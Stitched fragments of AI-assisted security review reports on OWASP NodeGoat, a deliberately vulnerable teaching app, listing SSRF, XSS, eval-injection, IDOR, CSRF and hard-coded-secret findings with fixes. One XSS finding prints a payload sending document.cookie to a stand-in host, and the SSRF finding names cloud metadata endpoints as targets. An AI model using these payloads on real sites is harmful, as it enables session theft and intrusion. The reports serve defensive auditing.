"fix": "Upgrade zaproxy (npm audit reports a semver-major fix, to 2.0.0-rc.7, is available) to pick up patched lodash and to drop the deprecated request package.",

"fix": "Validate the target against an allowlist of known-safe relative paths (or a same-origin check) before calling res.redirect(), and reject or default otherwise.",
"title": "Server-side request forgery in research lookup builds the fetch URL from query parameters",
"snippet": "const url = req.query.url + req.query.symbol;\n                return needle.get(url, (error, newResponse, body) => {",

"evidence": "displayResearch (app/routes/research.js:12-16), wired to GET /research behind only isLoggedIn (app/routes/index.js:76), concatenates req.query.url and req.query.symbol with no scheme, host, or destination validation and passes the result straight to needle.get(), which issues the outbound HTTP request from the server.",

"impact": "Any authenticated user can make the server issue requests to arbitrary hosts, including internal-only services, cloud metadata endpoints (e.g. 169.254.169.254), or localhost-bound admin interfaces, and the response body is echoed back verbatim in res.write(body) at line 25, turning the SSRF into a proxy for reading internal service responses.",

"fix": "Validate req.query.url against an allowlist of permitted external hosts/schemes before issuing the request, or route the lookup through a fixed, server-controlled base URL plus a validated symbol parameter instead of a fully attacker-supplied URL.",
"title": "Reflected XSS in profile update error page via unescaped lastName (and sibling fields)",
"snippet": "<input type=\"text\" class=\"form-control\" id=\"lastName\" name=\"lastName\" value=\"{{lastName}}\" placeholder=\"Enter last name\">",

"evidence": "server.js:135-137 calls swig.setDefaults({ autoescape: false }), which disables HTML escaping for every {{ }} interpolation in every swig template app-wide. app/routes/profile.js:42-50 destructures lastName (and ssn, dob, address, bankAcc, bankRouting) straight from req.body, and when the bankRouting regex check fails (lines 61-76) re-renders the profile view passing that raw, unmodified lastName back in, which this line outputs unescaped inside a double-quoted HTML attribute.",

"impact": "An attacker who submits a crafted lastName such as \"\\\"><script>document.location='//evil.example/c?'+document.cookie</script>\" together with an invalid bankRouting value gets it reflected unescaped into the response, executing in the victim's session and allowing session-cookie theft (the same unescaped pattern also applies to ssn, dob, address, bankAcc and bankRouting on the surrounding lines).",

"fix": "Re-enable swig's default autoescape (remove the autoescape: false override in server.js) and/or explicitly HTML-escape user-supplied values before interpolating them into attribute contexts.",
"title": "Stored XSS risk in memos: markdown-rendered user content is output with template autoescaping disabled",

"evidence": "app/routes/memos.js:11-16 stores req.body.memo verbatim via memosDAO.insert with no server-side HTML sanitization of the raw text. app/routes/memos.js:19-33 then re-lists every stored memo and renders this template, which passes doc.memo through marked() (configured with only { sanitize: true } in server.js:126-129) and outputs the result unescaped, since swig's global autoescape is disabled (server.js:137, see the profile.html finding). I did not read marked 0.3.5's own source to confirm whether its sanitize option fully blocks every vector (e.g. javascript: URIs in markdown links/images are a known historical bypass class for that option), so I stopped short of calling this confirmed.",

"impact": "If marked's sanitize option does not neutralize a given payload (e.g. a markdown link with a javascript: href), any user's memo text becomes stored HTML/script rendered to every user who views the shared memo list, enabling session hijacking or defacement for all viewers.",

"fix": "Re-enable swig autoescape globally, and additionally run the marked() output through a maintained HTML sanitizer (e.g. DOMPurify server-side or sanitize-html) rather than relying solely on marked's built-in sanitize flag, which is deprecated upstream.",

1: # Access department report — authentication, session handling and authorization
2: 
3: Target: `/root/targets/NodeGoat` (locked tree, 111 files, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3` per `target.json`). Read-only; nothing was written into it.
4: 
5: ## Method
6: 
7: `semgrep --version` printed `1.177.0`, so semgrep ran: `semgrep --config <local program pack> --config p/owasp-top-ten --metrics off --json /root/targets/NodeGoat`. It ran 113 rules over 72 tracked files and reported 29 hits. Every hit was read, not trusted as a finding on its own; two of them (the hardcoded-secret rule at `config/env/all.js:8` and the express-cookie-settings `no-secure`/`no-expires`/`no-httponly` rules at `server.js:78`) independently corroborated findings below that were already reached by reading the code first. The mongo-where, eval-on-input, string-concat and open-redirect hits (in `app/data/allocations-dao.js`, `app/routes/contributions.js`, `app/routes/index.js:72`) are injection/SSRF-class issues outside this department's remit and are left for the injection review. The `express-cookie-session-no-httponly` hit was read and rejected as a finding: express-session's documented default for `cookie.httpOnly` is `true`, so the absence of an explicit `httpOnly: true` in the options object does not by itself mean the cookie lacks the flag at runtime — treating that hit as a finding would have been pattern-matching, not reading.
8: 
9: ### Route table
10: 
11: Built from `app/routes/index.js` (the only place routes are registered, plus the `/tutorial` sub-router mounted at line 79) and each handler file. `isLoggedIn` = `sessionHandler.isLoggedInMiddleware` (checks `req.session.userId` truthy). `isAdmin` = `sessionHandler.isAdminUserMiddleware` (checks `req.session.userId` truthy **and** `user.isAdmin` true), defined at `app/routes/session.js:25-34` and exported at `index.js:27`, but never attached to any route as delivered.
12: 
13: | Method | Path | Chain (as registered) | Unauth caller | Wrong-identity caller |
14: | --- | --- | --- | --- | --- |
15: | GET | `/` | none | 200, welcome page | n/a |
16: | GET | `/login`, `/signup` | none | 200 | n/a |
17: | POST | `/login` | none | processes credentials, **no rate limit** | brute-forceable against any account |
18: | POST | `/signup` | none | creates account, regenerates session correctly | n/a |
19: | GET | `/logout` | none | destroys session (no-op if none), redirects `/` | fine |
20: | GET | `/dashboard`, `/profile`, `/contributions`, `/memos`, `/research` | `isLoggedIn` | 302 to `/login` | scoped to `req.session.userId`, no IDOR found |
21: | POST | `/profile`, `/contributions`, `/memos` | `isLoggedIn` | 302 to `/login` | scoped to own session id, but **no CSRF token anywhere in the app** |
22: | GET | `/benefits` | `isLoggedIn` **only** | 302 to `/login` | **any authenticated user gets every non-admin user's full record, including plaintext password** — isAdmin exists but is not attached |
23: | POST | `/benefits` | `isLoggedIn` **only** | 302 to `/login` | **any authenticated user can rewrite any other user's benefit date** — isAdmin exists but is not attached |
24: | GET | `/allocations/:userId` | `isLoggedIn` **only** | 302 to `/login` | **`:userId` from the URL is trusted directly** — any user can read any other user's allocation |
25: | GET | `/learn` | `isLoggedIn` | 302 to `/login` | open redirect via `req.query.url` — out of scope (injection dept) |
26: | `/tutorial/*` | GET | none | 200, static docs | n/a, not sensitive |
27: 
28: Three routes fail the "authenticated caller of the wrong identity" test outright: `GET /allocations/:userId`, `GET /benefits`, `POST /benefits`. Every state-changing POST route in the app is reachable with only the session cookie and no per-request token, because `csurf` is required (`server.js:7`) and would be mounted (`server.js:104-113`) only inside comments — it is never live for any request, which is a stronger version of "mounted after the routes it should cover": it is not mounted at all.
29: 
30: ## Findings
31: 
32: 10 findings, all `confidence: confirmed` except one `likely` (the `secure` cookie flag, which partly rests on express-session's documented — not locally-inspected — default). Full detail, evidence and fixes are in `findings/access.json`; summary:
33: 
34: - **critical** (1): `access-missing-role-benefits-view` — `GET /benefits` (`app/routes/index.js:55`) has no admin check and returns every non-admin user's plaintext password.
35: - **high** (4): `access-idor-allocations` (`app/routes/index.js:63`); `access-missing-role-benefits-update` (`app/routes/index.js:56`); `access-no-ratelimit-login` (`app/routes/index.js:34`); `access-hardcoded-session-secret` (`config/env/all.js:8`).
36: - **medium** (2): `access-session-fixation-login` (`app/routes/session.js:116`); `access-csrf-profile-update` (`app/routes/index.js:48`).
37: - **low** (3): `access-timing-unsafe-password-compare` (`app/data/user-dao.js:61`); `access-session-no-maxage` (`server.js:78-85`); `access-session-cookie-insecure` (`server.js:78-85`).
38: 
39: Each finding names the middleware chain actually in front of the route and what was absent from it, so the reasoning can be checked against `app/routes/index.js` directly rather than taken on trust.
40: 
41: ## What was not covered
42: 
43: - **Injection-class issues seen while reading route/handler files** were deliberately left out of this department's findings even though they were read: `eval()` on request input in `app/routes/contributions.js:32-34`, unsanitized Mongo `$where` construction in `app/data/allocations-dao.js:73,78`, the open redirect at `app/routes/index.js:72`, and SSRF via `needle.get` in `app/routes/research.js:12-28`. These belong to the injection department.
44: - **Data-exposure-class issues** noted but not filed as their own findings here: plaintext password storage in `app/data/user-dao.js:17-31` (bcrypt-nodejs is required but never called on write) is cited as supporting evidence for `access-missing-role-benefits-view` and `access-timing-unsafe-password-compare`, but the storage practice itself (CWE-256/CWE-916) is the data department's finding to file.
45: - **Runtime behavior no static read can confirm**: the actual deployed `NODE_ENV`, whether a reverse proxy adds `Secure`/`HSTS` in front of the app, and MongoDB's own access controls were not inspected — `config/config.js` and `config/env/*.js` were read, but nothing outside this repository (infrastructure, proxy config) was available to this review.
46: - **Dependency-level auth/session code** (express-session's, bcrypt-nodejs's or csurf's own internals) was not read; conclusions about their defaults rely on the packages' documented public API, not a source read of an installed copy, since `node_modules` is excluded from the locked tree. This is stated explicitly in the affected findings' `confidence`/`evidence` fields.
47: - **The `/tutorial` static pages and their embedded chart/JS assets** were sampled but not fully read line-by-line; they are documentation content served with no session interaction and were judged out of scope for authorization findings.
48: - **Timing-attack exploitability** of the `===` password comparison (`access-timing-unsafe-password-compare`) was not measured or proven remotely exploitable — only the code pattern was confirmed, which is why it is scored `low` rather than higher.
49: 
50: ## Scope and method note
51: 
52: This review is grounded by reading `app/routes/*.js`, `app/routes/session.js`, `app/data/user-dao.js`, `app/data/benefits-dao.js`, `server.js`, and `config/config.js`/`config/env/*.js` in full, and by a semgrep pass (local program rules + `p/owasp-top-ten`, `--metrics off`) whose hits were used only to direct reading, never taken as findings. It does not certify the target free of vulnerabilities; it certifies only that the findings above were mechanically verified to exist at the cited lines in the locked tree (see `node verify-safety-report.mjs --findings findings/access.json`).

(End of file - total 52 lines)
</content>

Built from `app/routes/index.js` (the only place routes are registered, plus the `/tutorial` sub-router mounted at line 79) and each handler file. `isLoggedIn` = `sessionHandler.isLoggedInMiddleware` (checks `req.session.userId` truthy). `isAdmin` = `sessionHandler.isAdminUserMiddleware` (checks `req.session.userId` truthy **and** `user.isAdmin` true), defined at `app/routes/session.js:25-34` and exported at `index.js:27`, but never attached to any route as delivered.
| Method | Path | Chain (as registered) | Unauth caller | Wrong-identity caller |
| POST | `/login` | none | processes credentials, **no rate limit** | brute-forceable against any account |
| POST | `/signup` | none | creates account, regenerates session correctly | n/a |
| GET | `/logout` | none | destroys session (no-op if none), redirects `/` | fine |
| GET | `/dashboard`, `/profile`, `/contributions`, `/memos`, `/research` | `isLoggedIn` | 302 to `/login` | scoped to `req.session.userId`, no IDOR found |
| POST | `/profile`, `/contributions`, `/memos` | `isLoggedIn` | 302 to `/login` | scoped to own session id, but **no CSRF token anywhere in the app** |
| GET | `/benefits` | `isLoggedIn` **only** | 302 to `/login` | **any authenticated user gets every non-admin user's full record, including plaintext password** — isAdmin exists but is not attached |
| POST | `/benefits` | `isLoggedIn` **only** | 302 to `/login` | **any authenticated user can rewrite any other user's benefit date** — isAdmin exists but is not attached |
| GET | `/allocations/:userId` | `isLoggedIn` **only** | 302 to `/login` | **`:userId` from the URL is trusted directly** — any user can read any other user's allocation |
| GET | `/learn` | `isLoggedIn` | 302 to `/login` | open redirect via `req.query.url` — out of scope (injection dept) |
| `/tutorial/*` | GET | none | 200, static docs | n/a, not sensitive |

Three routes fail the "authenticated caller of the wrong identity" test outright: `GET /allocations/:userId`, `GET /benefits`, `POST /benefits`. Every state-changing POST route in the app is reachable with only the session cookie and no per-request token, because `csurf` is required (`server.js:7`) and would be mounted (`server.js:104-113`) only inside comments — it is never live for any request, which is a stronger version of "mounted after the routes it should cover": it is not mounted at all.

- **The `/tutorial` static pages and their embedded chart/JS assets** were sampled but not fully read line-by-line; they are documentation content served with no session interaction and were judged out of scope for authorization findings.

- **Timing-attack exploitability** of the `===` password comparison (`access-timing-unsafe-password-compare`) was not measured or proven remotely exploitable — only the code pattern was confirmed, which is why it is scored `low` rather than higher.

60:   bundled `bson`. This driver is `require`d by every file in `app/data/`.

62:   file read, with `fixAvailable: false` — npm audit itself confirms **no patched release
63:   exists**. The registry marks it "no longer maintained." Also pulls a critical
64:   minimist prototype-pollution advisory transitively.

66:   `^1.15.1`, resolved `1.18.3`) — `high`. Open redirect, reflected XSS, and DoS advisories,

68:   `path-to-regexp`, `cookie`, `send`, `serve-static`).
69: - **`marked` (pinned exactly `0.3.5`)** — `high`. Six advisories: two sanitization-bypass/XSS
70:   issues and two ReDoS issues among them.

73: `bcrypt-nodejs` (hashes every user password, per `app/data/user-dao.js:1`, but the library itself
74: will never receive a fix), `node-esapi` (an 11-year-untouched output-encoding library), and
75: `needle` (exact-pinned 4 majors behind, no known advisory today).

77: ### devDependencies (8 findings)
78: 
79: `npm audit` flags 14 of NodeGoat's 21 devDependencies. I filed findings for the 8 most
80: significant and folded the rest (`grunt-cli`, `grunt-contrib-jshint`, `grunt-contrib-watch`,
81: `grunt-if`, `grunt-npm-install`, `grunt-retire`) into the `## What was not covered` section below
82: rather than pad the report with near-duplicate transitive chains — several of them (`grunt-if`,
83: `grunt-contrib-jshint`) resolve to the exact same `jshint`/`minimatch` chain already reported
84: under `jshint`.
85: 
86: Notable: `grunt` (declared `^1.0.3`) — the package this repo's own `npm test` and `precommit`

89: advisories. `cypress` and `zaproxy` each pull a `lodash` chain with a **critical** prototype
90: pollution advisory and a fully-deprecated `request` package with its own critical `form-data`
91: advisory — these run in dev/CI, not in production, and I scored them accordingly (`medium`/`low`
92: rather than the `critical` the raw audit aggregate reports), noting the CI-only blast radius in
93: each finding's evidence.
94:

96: I read every advisory `npm audit` reported and confirmed each resolved version against the
97: lockfile, but did not open the vulnerable transitive packages' call sites inside `node_modules`

107: - I did not trace any dependency's vulnerable function into this application's own call sites
108:   (e.g., whether `underscore.template()` is ever called with attacker-controlled input, or
109:   whether `swig`'s file-read path is reachable from a user-supplied template name). That tracing
110:   is injection/access department scope; this department reports what is *declared and
111:   installed*, not what is *reachable*, except where noted in a finding's evidence.

113:   chains already reported under another finding or add little beyond it: `grunt-cli` (moderate,

115:   `grunt-contrib-watch` (high, `gaze`→`minimatch` ReDoS, same `minimatch` advisories as
116:   `jshint`), `grunt-contrib-jshint` and `grunt-if` (both resolve to the identical
117:   `jshint`→`minimatch`/`shelljs` chain filed under `dependencies-jshint`), `grunt-npm-install`

120:   the same `underscore` advisory already filed). Each is a real `npm audit` hit at the version
121:   `package-lock.json` resolves; they are omitted from `findings/dependencies.json` for report
122:   signal, not because they are clean.

124:   `should` — the remaining devDependencies — had no `npm audit` hit and were not separately
125:   checked against the registry for staleness; I did not have budget to run the same
126:   deprecation/last-release check on all 21 devDependencies that I ran on the production ones.
127: - Typosquatting was not checked: I did not compare any of the 37 declared package names against
128:   known-package edit distance, beyond recognizing all of them as legitimate, long-published
129:   packages from the registry lookups already performed.

21: utilisées par ces routes ; elle n'a pas couvert les tests, les scripts de build
22: (Gruntfile, Cypress) ni les dépendances tierces (voir « Ce qui n'a pas été
23: couvert »).

31: ## Executive summary
32: 
33: This review covered NodeGoat (OWASP), a deliberately vulnerable Express.js
34: application, rooted at `/root/targets/NodeGoat` as locked by `target.json`. It
35: found 8 injection/traversal issues: 3 critical, 2 high, 3 medium. The most
36: important: (1) three critical server-side code-injection sinks via `eval()` on
37: the `preTax`/`afterTax`/`roth` contribution fields
38: (`app/routes/contributions.js:32-34`), letting any authenticated user run
39: arbitrary JavaScript on the server; (2) a high-severity NoSQL injection in the
40: allocations lookup through an unsanitized `$where` clause
41: (`app/data/allocations-dao.js:78`); (3) a high-severity server-side request
42: forgery in the research page, which builds its fetch URL from unvalidated query
43: parameters (`app/routes/research.js:15-16`). Semgrep (the department's local
44: rule pack plus the `p/owasp-top-ten` registry pack, metrics off) was run first
45: and used only as a reading map, never as a finding source: every reported line
46: was read and traced back to a real HTTP entry point. The review covered the
47: Express routes and handlers (`app/routes`), the MongoDB DAOs (`app/data`), and
48: the Swig views those routes render; it did not cover the test suite, build
49: scripts (Gruntfile, Cypress), or third-party dependency advisories (see "What
50: was not covered").
51: 
52: ## Scope and method
53: 
54: Repository: NodeGoat at `/root/targets/NodeGoat` (read-only target, 111 files
55: tracked in `target.json`, SHA-256 locked). In scope: `server.js`, `app/routes/*`,
56: `app/data/*`, `app/views/*`, and `config/*` insofar as they feed the request
57: paths above. Semgrep 1.177.0 was run with
58: `--config <local injection rules> --config p/owasp-top-ten --metrics off --json`
59: over the full target tree (29 raw hits, most of them GitHub Actions tag pinning,
60: plaintext HTTP links in tutorial pages, and cookie-flag findings that belong to
61: other departments); every hit relevant to injection was read in full source
62: context before being written up or discarded. Method:
63: [review-method](../review-method/SKILL.md) — entry points first, source traced
64: to sink, one finding per sink, confidence stated per what was actually read.
65: 
66: ## Findings
67: 
68: ### Critical
69: 
70: - `injection-eval-pretax` — Server-side code injection via `eval()` of the preTax contribution field — `app/routes/contributions.js:32` — CWE-95 — confirmed
71: - `injection-eval-aftertax` — Server-side code injection via `eval()` of the afterTax contribution field — `app/routes/contributions.js:33` — CWE-95 — confirmed
72: - `injection-eval-roth` — Server-side code injection via `eval()` of the roth contribution field — `app/routes/contributions.js:34` — CWE-95 — confirmed
73: 
74: ### High
75: 
76: - `injection-nosql-where-allocations` — NoSQL injection in allocations lookup via unsanitized `$where` threshold — `app/data/allocations-dao.js:78` — CWE-943 — confirmed
77: - `injection-ssrf-research` — SSRF in research lookup builds the fetch URL from query parameters — `app/routes/research.js:15` — CWE-918 — confirmed
78: 
79: ### Medium
80: 
81: - `injection-open-redirect-learn` — Open redirect on `/learn` takes the target URL from the query string unchecked — `app/routes/index.js:72` — CWE-601 — confirmed
82: - `injection-xss-profile-lastname` — Reflected XSS in profile update error page via unescaped `lastName` (and sibling fields) — `app/views/profile.html:45` — CWE-79 — confirmed
83: - `injection-xss-memos-marked` — Stored XSS risk in memos: markdown-rendered user content output with template autoescaping disabled — `app/views/memos.html:31` — CWE-79 — likely
84: 
85: ## What was not covered
86: 
87: - `test/` (unit, integration, security and e2e specs) and `cypress.json` — not treated as attacker-reachable production code.
88: - `Gruntfile.js` build tooling, including its `child_process.exec` call — invoked only by a developer running the build, not by any HTTP request path.
89: - `.github/workflows/*` — the semgrep scan flagged mutable Action tags there; out of this department's scope (CI supply chain, not request-path injection).
90: - Third-party dependency vulnerabilities in `marked@0.3.5`, `swig`, `bcrypt-nodejs`, etc. — this review read how those libraries are configured and called, not their own source, so any bug internal to the library (e.g. a bypass of marked's `sanitize` option) is noted as a `likely`-confidence caveat on `injection-xss-memos-marked` rather than asserted; a dependency-focused review should confirm it directly against the pinned version.
91: - Cookie flags, session-fixation, CSRF, and hard-coded-secret findings surfaced by the same semgrep run belong to the `access`, `data`, and `secrets` departments and are intentionally excluded here.
92: - Client-side JavaScript under `app/assets/vendor/*` (jQuery, Bootstrap, Raphael, html5shiv) — third-party vendored libraries, not application code; their own `innerHTML`/`document.write` usage is internal to the library and not driven by this application's request data.
93: - Runtime behavior no static read can confirm: the actual deployed MongoDB driver's handling of `$where`, network egress restrictions that might blunt the SSRF finding, and any WAF or reverse-proxy layer in front of the app.
94: 
95: ## Certificate
96: 
97: Mechanically verified via `node verify-safety-report.mjs --findings findings/injection.json`:
98: 8/8 findings resolve to an existing file and line (with matching snippet, whitespace
99: ignored) in the locked target tree; 8/8 ids unique; 8/8 CWE and OWASP identifiers
100: recognized; 0 findings share file, line, and CWE. This certifies the report's
101: internal consistency, not the completeness or correctness of the review's judgment.

(End of file - total 101 lines)

8: 
9: From there I followed each area named in the brief to its concrete file and line:
10: 
11: - Security headers and CORS: `server.js` (helmet block, lines 10 and 38-65); grepped the whole tree for `cors`/`Access-Control` (no hits — the app does not set CORS headers at all, so there is no permissive-CORS finding to make; this is noted under "not covered" below, not asserted as safe).

13: - Error handling: `app/routes/error.js` and the template it renders, `app/views/error-template.html`.
14: - Rate limiting: `app/routes/index.js` (the full route table) and `package.json` (no rate-limiting dependency present at all).
15: - Debug/development settings: `config/config.js`, `config/env/{all,development,production}.js`, and `docker-compose.yml`.
16: - Client-side/URL trust: `app/routes/index.js`'s `/learn` redirect, and the login template's reflection of `userName`.
17:

19: 
20: ## What I found
21: 
22: Eleven findings, all `confirmed` (one `likely`, marked as such), all traced to a specific line and re-verified with `node verify-safety-report.mjs --findings findings/platform.json` (11/11 verified against the locked tree). In order of what I consider most exploitable:
23:

28: - **The app only serves plaintext HTTP** (`server.js:145`, `CWE-319`, high) — the HTTPS path, including loading the certificate already present under `artifacts/cert/`, is fully commented out, so login credentials and the session cookie travel unencrypted by default.

34:

36:

38: - **File uploads**: NodeGoat has no upload endpoint in this codebase, so CWE-434 does not apply; not independently verified beyond the route table in `app/routes/index.js`.
39: - **Source maps**: this app ships hand-written `.html`/`.js` assets under `app/assets/`, not a bundler build, so there is no production source-map exposure surface to check.
40: - **Injection sinks** flagged by semgrep in `app/routes/contributions.js:32-34` (string-concatenated/`eval`-adjacent code) and `app/data/allocations-dao.js:73,78` (unvalidated `$where`) are real leads but belong to the injection department's mandate, not platform configuration; I read them only far enough to confirm they are not header/cookie/CORS/rate-limit/debug issues.

42: - **Authorization/session-fixation depth** (e.g., whether every route's admin check is consistent) is the access department's mandate; I only read `app/routes/index.js`'s route table for rate-limiting and CSRF purposes, not for authorization completeness.
43: - Runtime behavior that no static read can confirm: the actual value of `NODE_ENV`, TLS termination, and any header-injection done by a reverse proxy or WAF in front of a real deployment.

1: # Secrets — hard-coded credentials and leaked configuration
2: 
3: ## Scope and method
4: 
5: Target: `/root/targets/NodeGoat` (OWASP NodeGoat, a deliberately vulnerable Node.js/Express/MongoDB teaching app), 111 files locked by `target.json` (sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`), read-only.
6: 
7: `semgrep --version` reported `1.177.0`, so it was run: `semgrep --config <local dsh-secrets/injection/platform rules> --config p/owasp-top-ten --metrics off --json` over the target. It scanned 72 git-tracked files with 113 rules (570 available Code rules pulled in, most not applicable to this codebase) and reported 29 hits. Every semgrep hit was treated as a place to read, never as a finding on its own; the three `dsh-hardcoded-secret` hits (`config/env/all.js:8`, `config/env/development.js:6`, `config/env/test.js:6`) all led to confirmed findings below after reading the surrounding code and tracing where the values are consumed.
8: 
9: Beyond the semgrep hits, this review manually read: every file under `config/`, `server.js`, `artifacts/db-reset.js`, `artifacts/cert/server.key` and `server.crt`, `app/data/user-dao.js` and `profile-dao.js`, `docker-compose.yml`, `Dockerfile`, `app.json`, `Procfile`, `package.json`, `.travis.yml`, both GitHub Actions workflows, the three `test/e2e/fixtures/users/*.json` fixtures, `test/security/profile-test.js`, `.gitignore`/`.dockerignore`, and the tutorial HTML pages that a grep for `secret`/`password`/`key` literals flagged (`app/views/tutorial/a1.html`, `a2.html`, `a3.html`, `a6.html`). Targeted greps also covered: assignment patterns for password/passwd/secret/token/credential/apikey names, `mongodb(+srv)://user:pass@` connection strings, `BEGIN ... PRIVATE KEY` blocks, long base64/hex literals, and common vendor key prefixes (AWS `AKIA...`, Slack `xox...`, GitHub `ghp_`, Stripe `sk_live_`, SendGrid `SG.`). No `.env`, `.npmrc`, or `.netrc` file exists in the tree.
10: 
11: This is a language-model review grounded by semgrep and by the mechanical checks in `verify-safety-report.mjs`; it is not a claim that every secret-shaped string in the tree was found.
12: 
13: ## Findings
14: 
15: ### critical
16: 
17: - `secrets-db-seed-admin-password` — Database seed script hard-codes a plaintext admin password that the app compares directly at login (`artifacts/db-reset.js:18`, CWE-798, confirmed) — `docker-compose.yml` and `app.json`'s Heroku `postdeploy` hook both run this script on deployment, inserting `userName: "admin"` / `password: "Admin_123"`; `app/data/user-dao.js` compares stored and submitted passwords with plain `===`, so this literal is the live admin credential, not a placeholder hash. Fix: never seed a real deployment with a fixed password — generate/require one out of band, hash it, force a change on first login.
18: 
19: ### high
20: 
21: - `secrets-session-cookie-secret` — Session cookie signing secret is a hard-coded literal with no environment override (`config/env/all.js:8`, CWE-798, confirmed) — `server.js:82` passes this literal straight to `express-session({ secret: cookieSecret })` in every environment, since `config/env/production.js` is empty and never overrides it. Anyone who has read the repository can forge a signed session cookie. Fix: source the secret from an environment variable with no fallback, and rotate it.
22: 
23: ### medium
24: 
25: - `secrets-config-logged-to-stdout` — Full application config, including the session secret, is written to stdout on every startup (`config/config.js:13`, CWE-532, confirmed) — `console.log(util.inspect(config, false, null))` logs the merged config object, which contains `cookieSecret` and `cryptoKey`, unredacted, to whatever captures process stdout. Fix: stop logging the full config object, or redact known-sensitive keys first.
26: - `secrets-committed-rsa-private-key` — A real RSA private key is committed to the repository under `artifacts/cert/server.key` (lines 1–15, CWE-321, likely) — a valid PEM RSA private key, not gitignored, paired with `artifacts/cert/server.crt`; `server.js` contains a commented-out `https.createServer` block that reads this exact file, so it is not wired into the currently-running HTTP-only server but is exactly what the code's own documented HTTPS fix would load verbatim. Fix: remove the key from the repo and its history, generate TLS material per deployment outside version control, and revoke/reissue it if it was ever actually deployed.
27: 
28: ### low
29: 
30: - `secrets-hardcoded-cryptokey-unused` — Hard-coded AES key committed in config; the code that would use it to encrypt SSN/DOB is currently commented out (`config/env/all.js:9`, CWE-321, possible) — the only consumer, `app/data/profile-dao.js`'s `encrypt`/`decrypt` helpers, is entirely inside a block comment, so nothing decrypts or encrypts with this key today; the identical key is also shown as example code in the in-app tutorial (`app/views/tutorial/a6.html`) that teaches enabling this exact fix, so a developer following the tutorial verbatim would activate it. Fix: if enabled, source the key from a secrets manager, not a literal duplicated in documentation.
31: - `secrets-zap-api-key-test-config` — OWASP ZAP proxy API key is hard-coded in dev/test config and used by the security test suite (`config/env/development.js:6`, CWE-798, confirmed) — the same literal appears in `config/env/test.js:6` and is read by `test/security/profile-test.js` to authenticate to a local ZAP instance on an internal test network (`192.168.56.20`); it only ever authenticates to that local scanning tool, not a production system. Fix: generate the key per test run or source it from CI secrets instead of committing a fixed value.
32: 
33: ## What was not covered
34: 
35: - **Git history.** Only the working tree at the locked commit was read; `git log -p` / a full-history secret scan (gitleaks/trufflehog) was not run, so a secret rotated out of `HEAD` but still present in an earlier commit would not have been found.
36: - **`node_modules` and third-party dependency source.** Not part of `target.json`'s locked file list and not read; a vendored dependency shipping its own hard-coded credential would not have been caught.
37: - **Runtime/deployed configuration.** This is a static read of the committed tree. Whatever `MONGODB_URI`, `NODE_ENV`, or other environment variables an actual deployment sets at runtime (Heroku config vars, a real docker-compose `.env`, a Kubernetes secret) were not observed and could differ from — or could still be missing for — the values discussed above.
38: - **Binary/compiled or minified vendor assets** under `app/assets/vendor/` (jQuery, Bootstrap, Chart libraries, font files) were not opened; they are unlikely to carry this application's secrets but were not searched byte-for-byte.
39: - **Non-secrets classes of vulnerability** (SQL/NoSQL injection, XSS, open redirect, CSRF, insecure cookie flags, ReDoS) surfaced by the same semgrep run are out of scope for this department and are left for the injection, platform, and access reviews; several of the semgrep hits listed under Scope and method (e.g. `express-open-redirect`, `express-cookie-session-no-httponly`, the `dsh-eval-on-input`/`code-string-concat` hits in `app/routes/contributions.js`) were read only far enough to confirm they carry no additional hard-coded credential, not triaged for their own vulnerability class.
40: - **`secrets-hardcoded-cryptokey-unused`** is reported at `possible` confidence and low severity specifically because the consuming code path is dead as shipped; if a future change re-enables `app/data/profile-dao.js`'s commented block, its severity should be reassessed as live (comparable to the session-secret finding).

(End of file - total 40 lines)
</content>
